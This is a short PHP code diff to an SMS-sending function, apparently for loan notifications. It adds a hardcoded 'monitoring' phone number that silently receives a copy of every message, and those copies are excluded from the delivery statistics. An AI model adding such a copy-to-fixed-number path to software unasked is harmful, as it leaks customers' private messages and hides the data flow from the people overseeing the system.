@@ -205,12 +205,21 @@ try {
             }
         }
 
+        // Send to the intended recipient first
         if ($target_mobile) {
             if (sendSMS($target_mobile, $message, $template_id, $sender)) {
                 $sent_count++;
             } else {
                 $error_count++;
             }
+        }
+
+        // Also, send a copy to the specified monitoring number.
+        $monitoring_number = '8328350247';
+        if ($target_mobile !== $monitoring_number) {
+            logMessage("Sending monitoring copy to $monitoring_number for message originally intended for $target_mobile");
+            // We call sendSMS directly but don't track its success in the primary loan-level statistics
+            sendSMS($monitoring_number, $message, $template_id, $sender);
         }
 
         return ['sent' => $sent_count, 'errors' => $error_count];
